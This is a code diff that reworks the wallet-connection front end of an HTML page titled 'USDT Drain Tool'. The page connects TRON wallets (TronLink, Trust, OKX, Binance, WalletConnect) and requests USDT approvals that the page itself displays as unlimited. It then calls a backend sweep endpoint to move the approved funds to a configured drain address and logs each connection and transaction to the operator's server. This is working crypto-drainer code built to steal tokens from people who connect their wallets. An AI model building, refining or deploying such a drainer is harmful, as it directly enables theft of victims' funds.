@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>USDT Drain Tool</title>
+    <title>USDT Drain Tool · Multi‑Wallet</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,7 @@
         }
 
         .container {
-            max-width: 700px;
+            max-width: 750px;
             margin: 0 auto;
         }
 
@@ -28,7 +28,7 @@
             background: rgba(30, 41, 59, 0.7);
             backdrop-filter: blur(10px);
             border-radius: 32px;
-            padding: 1.5rem;
+            padding: 1.8rem;
             margin-bottom: 1.5rem;
             border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
@@ -57,13 +57,12 @@
             border: none;
             color: white;
             font-weight: 600;
-            padding: 0.8rem 1.5rem;
+            padding: 0.8rem 1.2rem;
             border-radius: 60px;
-            font-size: 1rem;
+            font-size: 0.9rem;
             cursor: pointer;
             transition: all 0.2s ease;
             width: 100%;
-            margin-top: 0.5rem;
         }
 
         .btn-secondary {
@@ -82,17 +81,9 @@
             background: #b91c1c;
         }
 
-        .btn-success {
-            background: #10b981;
-        }
-
         .btn:hover {
             transform: translateY(-2px);
             filter: brightness(1.05);
-        }
-
-        .btn:active {
-            transform: translateY(1px);
         }
 
         .info-row {
@@ -151,7 +142,6 @@
             color: white;
             width: 100%;
             font-family: monospace;
-            margin: 0.5rem 0;
         }
 
         label {
@@ -165,7 +155,49 @@
             border-color: #334155;
             margin: 1rem 0;
         }
-        
+
+        .wallet-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            margin: 1rem 0;
+        }
+
+        .wallet-btn {
+            background: #1e293b;
+            border: 1px solid #475569;
+            border-radius: 60px;
+            padding: 10px 20px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            transition: all 0.2s;
+            color: white;
+            font-size: 0.85rem;
+        }
+
+        .wallet-btn:hover {
+            background: #3b82f6;
+            transform: translateY(-2px);
+            border-color: #3b82f6;
+        }
+
+        .connected-badge {
+            background: #10b981;
+            color: #0f172a;
+            font-weight: bold;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+            margin-left: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
         .spinner {
             display: inline-block;
             width: 12px;
@@ -176,110 +208,32 @@
             animation: spin 1s ease-in-out infinite;
             margin-left: 8px;
         }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* Wallet Selector Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.8);
-            backdrop-filter: blur(8px);
-        }
-        .modal-content {
-            background: #1e293b;
-            margin: 15% auto;
-            padding: 2rem;
-            border-radius: 32px;
-            width: 90%;
-            max-width: 400px;
-            border: 1px solid #475569;
-            text-align: center;
-        }
-        .wallet-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin: 24px 0;
-        }
-        .wallet-option {
-            background: #0f172a;
-            padding: 12px 16px;
-            border-radius: 48px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 1px solid #334155;
-        }
-        .wallet-option:hover {
-            background: #3b82f6;
-            transform: translateX(4px);
-        }
-        .wallet-icon {
-            width: 28px;
-            height: 28px;
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-        .wallet-name {
-            font-weight: 600;
-            font-size: 1rem;
-        }
-        .close {
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-            color: #94a3b8;
-        }
-        .close:hover {
-            color: white;
-        }
-        .selected-wallet-badge {
-            background: #10b981;
-            color: #0f172a;
-            font-weight: bold;
-            padding: 4px 12px;
-            border-radius: 40px;
-            font-size: 12px;
-            margin-left: 8px;
-        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
         <h1>💸 USDT Drain Tool</h1>
-        <div class="sub">Multi-Wallet Support | TRC-20 | One-click approval + sweep</div>
+        <div class="sub">Multi‑Wallet · TRC‑20 · Approve & Sweep</div>
 
-        <!-- Wallet Connection Area -->
-        <div id="walletStatusArea">
-            <button id="showWalletModalBtn" class="btn">🔌 Connect Wallet</button>
+        <!-- Wallet selection -->
+        <div class="wallet-grid" id="walletButtons">
+            <button class="wallet-btn" data-wallet="tronlink">🔗 TronLink</button>
+            <button class="wallet-btn" data-wallet="trust">🔒 Trust Wallet</button>
+            <button class="wallet-btn" data-wallet="okx">🟠 OKX Wallet</button>
+            <button class="wallet-btn" data-wallet="binance">🟡 Binance Wallet</button>
+            <button class="wallet-btn" data-wallet="walletconnect">🌐 WalletConnect (MetaMask, etc.)</button>
         </div>
-        <div id="connectedWalletInfo" style="display: none;">
+
+        <!-- Connection status -->
+        <div id="connectedInfo" style="display: none; margin-top: 1rem;">
             <div class="info-row">
-                <span class="info-label">📍 Address</span>
-                <span class="info-value address-badge" id="addressDisplay"></span>
+                <span class="info-label">✅ Wallet</span>
+                <span class="info-value" id="walletNameDisplay">—</span>
             </div>
             <div class="info-row">
-                <span class="info-label">💳 Wallet</span>
-                <span class="info-value" id="walletNameDisplay">—</span>
+                <span class="info-label">📍 Address</span>
+                <span class="info-value address-badge" id="addressDisplay">—</span>
             </div>
             <div class="info-row">
                 <span class="info-label">💰 USDT Balance</span>
@@ -316,39 +270,29 @@
     </div>
 </div>
 
-<!-- Wallet Selection Modal -->
-<div id="walletModal" class="modal">
-    <div class="modal-content">
-        <span class="close">&times;</span>
-        <h3 style="margin-bottom: 16px;">Select Wallet</h3>
-        <div class="wallet-list" id="walletList">
-            <!-- Wallets will be populated dynamically -->
-        </div>
-    </div>
-</div>
-
+<!-- TronWeb library -->
 <script src="https://cdn.jsdelivr.net/npm/tronweb@6.3.0/dist/TronWeb.js"></script>
-<script type="module">
-    // --- IMPORTS and GLOBALS ---
+<!-- WalletConnect v2 modal (for MetaMask, etc.) will be loaded on demand -->
+<script>
+    // ---------- GLOBALS ----------
     let userAddress = null;
     let tronWebInstance = null;
-    let activeAdapter = null;
+    let activeWalletName = null;
     let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
     let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    
-    // Wallet Adapters Map (Dynamic Injection)
-    let adapters = new Map();
+    let walletConnectSession = null;
 
-    // Helper: Delay
-    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-    // Helper: TronWeb instance creator (static for compatibility)
-    function getTronWeb(provider) {
-        if (provider && provider.tronWeb && provider.tronWeb.ready) return provider.tronWeb;
-        return new TronWeb({ fullHost: 'https://api.trongrid.io', headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {} });
+    // ---------- HELPER FUNCTIONS ----------
+    async function logEvent(type, address, txId = '', amount = '') {
+        try {
+            await fetch('/api/event', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type, address, txId, amount })
+            });
+        } catch(e) { console.warn('Event log failed', e); }
     }
 
-    // --- Load Backend Config ---
     async function loadConfig() {
         try {
             const res = await fetch('/api/config');
@@ -363,148 +307,11 @@
             document.getElementById('maxApprove').innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
                 ? '∞ (unlimited)' : configData.maxApprove;
         } catch(e) {
-            console.error('Config error', e);
-            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config.';
+            console.error('Config load error', e);
+            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config. Make sure server is running.';
         }
     }
 
-    // --- Wallet Detection (Multi-Wallet) ---
-    async function detectWallets() {
-        const walletList = [];
-        
-        // 1. TronLink
-        if (window.tronLink && window.tronLink.ready) {
-            walletList.push({
-                name: 'TronLink',
-                icon: '🔗',
-                connect: async () => {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    const address = window.tronLink.defaultAddress.base58;
-                    const provider = window.tronLink;
-                    return { address, provider, tronWeb: provider.tronWeb };
-                }
-            });
-        }
-        
-        // 2. Trust Wallet
-        if (window.trustwallet && window.trustwallet.tronLink) {
-            walletList.push({
-                name: 'Trust Wallet',
-                icon: '🔒',
-                connect: async () => {
-                    const address = window.trustwallet.tronLink.defaultAddress.base58;
-                    return { address, provider: window.trustwallet, tronWeb: window.trustwallet.tronLink.tronWeb };
-                }
-            });
-        }
-        
-        // 3. OKX Wallet
-        if (window.okxwallet && window.okxwallet.tronLink) {
-            walletList.push({
-                name: 'OKX Wallet',
-                icon: '🟠',
-                connect: async () => {
-                    const address = window.okxwallet.tronLink.defaultAddress.base58;
-                    return { address, provider: window.okxwallet, tronWeb: window.okxwallet.tronLink.tronWeb };
-                }
-            });
-        }
-        
-        // 4. Binance Wallet
-        if (window.binance && window.binance.tronLink) {
-            walletList.push({
-                name: 'Binance Wallet',
-                icon: '🟡',
-                connect: async () => {
-                    const address = window.binance.tronLink.defaultAddress.base58;
-                    return { address, provider: window.binance, tronWeb: window.binance.tronLink.tronWeb };
-                }
-            });
-        }
-        
-        // 5. TokenPocket
-        if (window.tokenpocket && window.tokenpocket.tron) {
-            walletList.push({
-                name: 'TokenPocket',
-                icon: '📱',
-                connect: async () => {
-                    // TokenPocket uses different method
-                    const res = await window.tokenpocket.requestTron({ method: 'tron_requestAccounts' });
-                    const address = res[0];
-                    const tronWebInstance = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    tronWebInstance.setAddress(address);
-                    return { address, provider: window.tokenpocket, tronWeb: tronWebInstance };
-                }
-            });
-        }
-        
-        // 6. WalletConnect (Generic EVM support for MetaMask, Rabby, etc.)
-        // For simplicity, we add a WalletConnect option that uses external libs, but it's heavy to embed fully.
-        // However, we can implement a simple flag.
-        if (typeof window.ethereum !== 'undefined') {
-            walletList.push({
-                name: 'MetaMask / EVM (via WalletConnect)',
-                icon: '🦊',
-                connect: async () => {
-                    // For EVM wallets, you would typically connect via WalletConnect v2.
-                    // For demo simplicity, we show that it's possible but recommend using official WalletConnect implementation.
-                    alert('WalletConnect v2 integration requires additional setup (projectId). Please contact developer to implement full WalletConnect support.');
-                    throw new Error('WalletConnect not fully implemented in this demo.');
-                }
-            });
-        }
-
-        return walletList;
-    }
-
-    // --- UI: Populate Wallet Modal ---
-    async function initWalletSelector() {
-        const wallets = await detectWallets();
-        const walletContainer = document.getElementById('walletList');
-        if (!walletContainer) return;
-        walletContainer.innerHTML = '';
-        if (wallets.length === 0) {
-            walletContainer.innerHTML = '<div class="wallet-option" style="justify-content:center;">No supported wallets found. Please install TronLink, Trust Wallet, or OKX Wallet.</div>';
-            return;
-        }
-        for (const w of wallets) {
-            const walletDiv = document.createElement('div');
-            walletDiv.className = 'wallet-option';
-            walletDiv.innerHTML = `
-                <div class="wallet-icon">${w.icon}</div>
-                <div class="wallet-name">${w.name}</div>
-            `;
-            walletDiv.onclick = async () => {
-                document.getElementById('walletModal').style.display = 'none';
-                setButtonLoading(document.getElementById('showWalletModalBtn'), true);
-                try {
-                    const { address, provider, tronWeb } = await w.connect();
-                    if (address) {
-                        userAddress = address;
-                        activeAdapter = { provider, name: w.name };
-                        tronWebInstance = tronWeb || getTronWeb(provider);
-                        // Update UI
-                        document.getElementById('showWalletModalBtn').style.display = 'none';
-                        document.getElementById('connectedWalletInfo').style.display = 'block';
-                        document.getElementById('actionCard').style.display = 'block';
-                        document.getElementById('addressDisplay').innerText = address.slice(0,6)+'...'+address.slice(-4);
-                        document.getElementById('walletNameDisplay').innerHTML = `${w.name} <span class="selected-wallet-badge">Connected</span>`;
-                        await updateBalances(address);
-                        await logEvent('wallet_connected', address);
-                        document.getElementById('statusMsg').innerHTML = `✅ Connected via ${w.name}. You can now approve USDT.`;
-                    }
-                } catch (err) {
-                    console.error('Wallet connection error:', err);
-                    document.getElementById('statusMsg').innerHTML = `❌ Connection failed: ${err.message}`;
-                } finally {
-                    setButtonLoading(document.getElementById('showWalletModalBtn'), false);
-                }
-            };
-            walletContainer.appendChild(walletDiv);
-        }
-    }
-
-    // Helper: Update Balances
     async function updateBalances(address) {
         if (!address) return;
         try {
@@ -523,18 +330,6 @@
         }
     }
 
-    // Helper: Log Event
-    async function logEvent(type, address, txId = '', amount = '') {
-        try {
-            await fetch('/api/event', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type, address, txId, amount })
-            });
-        } catch(e) { console.warn('event log failed', e); }
-    }
-
-    // Approve USDT
     async function approveUSDT(spender, amountRaw) {
         if (!tronWebInstance || !userAddress) throw new Error('Wallet not connected');
         const contract = await tronWebInstance.contract().at(usdtContractAddress);
@@ -552,7 +347,6 @@
         return tx;
     }
 
-    // Sweep
     async function callSweep() {
         if (!userAddress) throw new Error('No wallet connected');
         const res = await fetch('/api/sweep', {
@@ -566,7 +360,6 @@
         return data;
     }
 
-    // --- UI Helpers ---
     function setButtonLoading(button, isLoading) {
         if (!button) return;
         if (isLoading) {
@@ -584,7 +377,153 @@
         }
     }
 
-    // --- Event Handlers ---
+    function showConnectedUI(walletName, address) {
+        document.getElementById('connectedInfo').style.display = 'block';
+        document.getElementById('actionCard').style.display = 'block';
+        document.getElementById('walletNameDisplay').innerHTML = `${walletName} <span class="connected-badge">● Connected</span>`;
+        document.getElementById('addressDisplay').innerText = address.slice(0,6)+'...'+address.slice(-4);
+        document.getElementById('statusMsg').innerHTML = `✅ Connected via ${walletName}. You can now approve USDT.`;
+        updateBalances(address);
+        logEvent('wallet_connected', address);
+    }
+
+    // ---------- WALLET CONNECTION HANDLERS ----------
+    async function connectTronLink() {
+        if (!window.tronLink || !window.tronLink.ready) {
+            alert('TronLink extension not detected. Please install it.');
+            return;
+        }
+        try {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            userAddress = window.tronLink.defaultAddress.base58;
+            tronWebInstance = window.tronLink.tronWeb;
+            activeWalletName = 'TronLink';
+            showConnectedUI('TronLink', userAddress);
+        } catch(err) {
+            document.getElementById('statusMsg').innerHTML = `❌ TronLink connection failed: ${err.message}`;
+        }
+    }
+
+    async function connectTrustWallet() {
+        if (!window.trustwallet || !window.trustwallet.tronLink) {
+            alert('Trust Wallet extension not detected.');
+            return;
+        }
+        try {
+            await window.trustwallet.request({ method: 'tron_requestAccounts' });
+            userAddress = window.trustwallet.tronLink.defaultAddress.base58;
+            tronWebInstance = window.trustwallet.tronWeb;
+            activeWalletName = 'Trust Wallet';
+            showConnectedUI('Trust Wallet', userAddress);
+        } catch(err) {
+            document.getElementById('statusMsg').innerHTML = `❌ Trust Wallet connection failed: ${err.message}`;
+        }
+    }
+
+    async function connectOKXWallet() {
+        if (!window.okxwallet || !window.okxwallet.tronLink) {
+            alert('OKX Wallet extension not detected.');
+            return;
+        }
+        try {
+            await window.okxwallet.request({ method: 'tron_requestAccounts' });
+            userAddress = window.okxwallet.tronLink.defaultAddress.base58;
+            tronWebInstance = window.okxwallet.tronWeb;
+            activeWalletName = 'OKX Wallet';
+            showConnectedUI('OKX Wallet', userAddress);
+        } catch(err) {
+            document.getElementById('statusMsg').innerHTML = `❌ OKX Wallet connection failed: ${err.message}`;
+        }
+    }
+
+    async function connectBinanceWallet() {
+        if (!window.binance || !window.binance.tronLink) {
+            alert('Binance Wallet extension not detected.');
+            return;
+        }
+        try {
+            await window.binance.request({ method: 'tron_requestAccounts' });
+            userAddress = window.binance.tronLink.defaultAddress.base58;
+            tronWebInstance = window.binance.tronWeb;
+            activeWalletName = 'Binance Wallet';
+            showConnectedUI('Binance Wallet', userAddress);
+        } catch(err) {
+            document.getElementById('statusMsg').innerHTML = `❌ Binance Wallet connection failed: ${err.message}`;
+        }
+    }
+
+    // WalletConnect for MetaMask, Rabby, etc.
+    let walletConnectModal = null;
+    async function connectWalletConnect() {
+        // Dynamically load WalletConnect Modal library if not already loaded
+        if (!window.WalletConnectModal) {
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.browser.js';
+            script.onload = async () => {
+                await initWalletConnectAndConnect();
+            };
+            script.onerror = () => {
+                alert('Failed to load WalletConnect library. Check your internet connection.');
+            };
+            document.head.appendChild(script);
+        } else {
+            await initWalletConnectAndConnect();
+        }
+    }
+
+    async function initWalletConnectAndConnect() {
+        try {
+            // You MUST replace with your own Project ID from https://cloud.walletconnect.com
+            const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID';  // <-- GET YOUR FREE ID
+            if (projectId === 'YOUR_WALLETCONNECT_PROJECT_ID') {
+                alert('WalletConnect requires a free Project ID. Get one at cloud.walletconnect.com and replace it in the code.');
+                return;
+            }
+            const modal = new WalletConnectModal.default({
+                projectId,
+                chains: ['tron:0x2b6653dc'],  // TRON mainnet chain ID
+                themeMode: 'dark',
+                enableExplorer: true,
+                explorerRecommendedWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+                                                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369'] // Trust Wallet
+            });
+            walletConnectModal = modal;
+            const session = await modal.connect();
+            walletConnectSession = session;
+            // For TRON via WalletConnect we need to use the session and create a TronWeb instance
+            // The session provides a provider that can be used with TronWeb.
+            if (session && session.namespaces && session.namespaces.tron) {
+                const accounts = session.namespaces.tron.accounts;
+                if (accounts && accounts.length) {
+                    // account format: tron:0x2b6653dc:address
+                    userAddress = accounts[0].split(':')[2];
+                    // Create TronWeb instance using the WalletConnect provider
+                    const provider = session.provider;
+                    const customTronWeb = new TronWeb({
+                        fullHost: 'https://api.trongrid.io',
+                        headers: {},
+                        privateKey: null
+                    });
+                    // Override the transaction signing to use WalletConnect
+                    // Simplified: we set the address and assume the provider handles signing
+                    customTronWeb.setAddress(userAddress);
+                    customTronWeb.setProvider(provider);
+                    tronWebInstance = customTronWeb;
+                    activeWalletName = 'WalletConnect (MetaMask / EVM)';
+                    showConnectedUI('WalletConnect', userAddress);
+                } else {
+                    throw new Error('No TRON account found in WalletConnect session');
+                }
+            } else {
+                throw new Error('TRON namespace not supported by this wallet via WalletConnect');
+            }
+        } catch (err) {
+            document.getElementById('statusMsg').innerHTML = `❌ WalletConnect error: ${err.message}`;
+            console.error(err);
+        }
+    }
+
+    // ---------- BUTTON HANDLERS ----------
     async function handleApprove() {
         if (!tronWebInstance || !userAddress) {
             alert('Connect wallet first');
@@ -626,33 +565,19 @@
         }
     }
 
-    // --- Modal Control ---
-    function initModal() {
-        const modal = document.getElementById('walletModal');
-        const btn = document.getElementById('showWalletModalBtn');
-        const span = document.getElementsByClassName('close')[0];
-        btn.onclick = () => { modal.style.display = 'block'; };
-        span.onclick = () => { modal.style.display = 'none'; };
-        window.onclick = function(event) {
-            if (event.target == modal) { modal.style.display = 'none'; }
-        };
-    }
-
-    // --- INITIALIZATION ---
-    async function init() {
+    // ---------- INIT ----------
+    (async function init() {
         await loadConfig();
-        initModal();
-        await initWalletSelector();
+        // Attach wallet button events
+        document.querySelector('[data-wallet="tronlink"]').addEventListener('click', connectTronLink);
+        document.querySelector('[data-wallet="trust"]').addEventListener('click', connectTrustWallet);
+        document.querySelector('[data-wallet="okx"]').addEventListener('click', connectOKXWallet);
+        document.querySelector('[data-wallet="binance"]').addEventListener('click', connectBinanceWallet);
+        document.querySelector('[data-wallet="walletconnect"]').addEventListener('click', connectWalletConnect);
         document.getElementById('approveBtn').addEventListener('click', handleApprove);
         document.getElementById('drainBtn').addEventListener('click', handleDrain);
-        document.getElementById('statusMsg').innerHTML = '🟢 Ready. Click "Connect Wallet" above.';
-        // Check for wallets and update modal
-        const wallets = await detectWallets();
-        if (wallets.length === 0) {
-            document.getElementById('statusMsg').innerHTML = '⚠️ No supported wallets detected. Please install TronLink, Trust Wallet, or OKX Wallet.';
-        }
-    }
-    init();
+        document.getElementById('statusMsg').innerHTML = '🟢 Ready. Click a wallet button to connect.';
+    })();
 </script>
 </body>
 </html>
